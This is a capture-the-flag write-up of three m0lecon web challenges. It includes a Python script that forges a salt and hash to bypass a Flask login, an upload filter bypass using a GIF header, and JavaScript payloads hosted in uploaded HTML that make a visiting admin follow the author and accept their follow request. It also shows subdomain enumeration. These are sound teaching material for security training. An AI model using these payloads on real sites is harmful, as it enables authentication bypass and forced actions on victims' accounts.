# web

## Lucky Fall
> Solved By : thewhiteh4t

- we have a simple login page
- JSON body is sent to the server which contains username and password
- Unusual thing here is that the error is shown in a javascript alert

![](https://i.imgur.com/gDkpo4r.png)

- the page source looked normal so I proceeded to intercept the login request with burpsuite
- if we remove the `name` key value pair from JSON body we can see the following error :

![](https://i.imgur.com/bcDVpIS.png)

- this error reveals few things to us :
    - python flask backend is used
    - the exceptions are showed in the alert pop up
    - `name` key value pair are required

- after this I tried to remove the `password` key : 

![](https://i.imgur.com/SZeBtyH.png)

- here we can see an `if` condition which looks like the logic behind the login function
- It is calculating the SHA256 hash of concatenation of `password` and `salt`
- then it compares it with a `hash` value
- but if we take a look carefully we can see that the values of `salt` and `hash` are being taken from the JSON request body
- so we can set our own `salt` and `hash` just like `username` and `password`
- I wrote a small python script to get the flag
- here `username`, `password` and `salt` can be any values, we just need to satisfy the if condition to get the flag

```python
#!/usr/bin/env python3

import requests
import hashlib

url = 'http://lucky-fall.challs.m0lecon.it/'
uname = 'admin'
passw = 'password'
salt = 'salt'
Hash = hashlib.sha256((passw + salt).encode('UTF-8')).hexdigest()

json_body = {
    'name': uname,
    'password': passw,
    'salt': salt,
    'hash': Hash
}

r = requests.post(url + 'login', json=json_body)
print(r.text)
```

**OUTPUT :**

![](https://i.imgur.com/257p2bC.png)

---

## Key-Lottery
> Solved by: Taz34

We have a simple website which asks for Keys and gives a set of rule.
“Keys should be sent as comma separated string of key guesses. Letters and digits only. No spaces.”
We also have an attachment server.py

![](https://i.imgur.com/ecj5VOC.png)

Now first we tried many diffrent chars like $,% etc, but we got an error

![](https://i.imgur.com/2O7YinW.png)

In the attachment file we see:
“/guess?keys=key0,key1,key2”
here we know that we need 3 keys.

After entering many different combination of inputs, we thought of using just comma as input.
At first we entered a single comma we got:

![](https://i.imgur.com/FejpM9s.png)

Now i though of giving 3 comma’s as input, as we have 3 keys:

![](https://i.imgur.com/IwAUcZ4.png)

And we got:

![](https://i.imgur.com/b4hLejF.png)

that looks like a character set.
So i tried using this a the input with 3 comma’s so as to complete the requirement:

![](https://i.imgur.com/UC4jCyo.png)

And here we have the flag:

![](https://i.imgur.com/0x1x0RQ.png)

---

## M0leFans
> Solved By : thewhiteh4t

This challenge begins at a login/register page, after login we can see the following :

- public feed
- profile settings
- report link
- create post button
- search
- copy profile link
- followers

![](https://i.imgur.com/Dta95kx.png)

Inside settings we can set our custom subdomain and we can upload an avatar as well. I tried lot of XSS payloads in name fields as well as create post but JS was not executing, instead it was being printed on the page like normal text so I tried file upload instead

Only images are supported in the file upload but it can be easily bypassed with a GIF header or any other image header

```
GIF header -> GIF89a;
```

After trying different file formats for upload I noticed that files were not executing at all, instead they were being downloaded as text files with a randomized filename, so eventually I tried an HTML file with a simple JS alert pop up and it worked!

File upload : 

![](https://i.imgur.com/w1mVfzK.png)

In inspect element we can see that a HTML file has appeared in `src` of `img` tag :

![](https://i.imgur.com/NdzDLgV.png)

and the JS code is working!

![](https://i.imgur.com/obQ9nEi.png)

Now I saw the report link at the bottom of the page and it mentions that we can report posts to admin, at this point I thought we need to steal the cookie of admin and get access to the admin account but when I checked the cookie it had `HttpOnly`  flag enabled so this was not the correct direction.

I read the challenge description again and it mentions about `following` people, now I thought if somehow I can make the admin follow my account then I will be able to get the flag so I started looking into the `follow` request

![](https://i.imgur.com/K2BgOiQ.png)

It is a simple GET request on `/profile/follow` . Since JS is working I made a small JS script to call this request.

In theory it works like this :

1. Upload new HTML file with updated JS script
2. Get the HTML file link from page source
3. Report the link
4. Admin opens the link and since JS will automatically execute the admin will silently follow us

HTML code :

```html
GIF89a;
<html>
<head></head>
<body>
    <script>
        var xhttp = new XMLHttpRequest();
        xhttp.open("GET", "https://twc.m0lecon.fans/profile/follow", true);
        xhttp.withCredentials = true;
        xhttp.send();
    </script>
</body>
</html>
```

I got a success message after submitting the link

![](https://i.imgur.com/O3y4LjU.png)

And on the followers page I got a new request!

![](https://i.imgur.com/OFsnhsW.png)

This is the admin, I accepted the request but nothing happens, I cant see the profile of admin there is no link provided. To access the admin profile I needed a subdomain because every profile gets its own unique subdomain. I tried to guess it but that did not work, then I poked around the site for some time but could not find anything which revealed the subdomain so I used a classic technique, `subdomain enumeration` :

```
finalrecon --sub https://m0lecon.fans
```

![](https://i.imgur.com/sjgHZUy.png)

and that’s how I found the required subdomain!

```
y0urmuchb3l0v3d4dm1n.m0lecon.fans
```

But when I visited the profile, there is again nothing, the profile is private and bio does not have the flag, but there is a follow button!

![](https://i.imgur.com/OxbCBUZ.png)

When I clicked the follow button it showed request pending!

![](https://i.imgur.com/nxBijew.png)

I waited for some time thinking admin will automatically accept the request but that did not happen so that reminded me that maybe I can make the admin accept my follow request just like before!

The flow was similar to last time but this time a POST request was being sent to `/profile/requests` with a body which contained the `id` of the user who has sent the friend request.

Now I started looking for my id when i noticed that the session cookie is JWT. I decoded the JWT and got the id!

![](https://i.imgur.com/0hP8whT.png)

After compiling the information above here is the new HTML code :

```html
GIF89a;
<html>
<head></head>
<body>
    <script>
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "https://y0urmuchb3l0v3d4dm1n.m0lecon.fans/profile/request", true);
        xhttp.withCredentials = true;
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send("id=30");
    </script>
</body>
</html>
```

The upload and report were successful just like before and now the admin accepted our follow request!

![](https://i.imgur.com/fVwgb9v.png)

and the fan post contains our beloved flag!

![](https://i.imgur.com/GTPqIKb.png)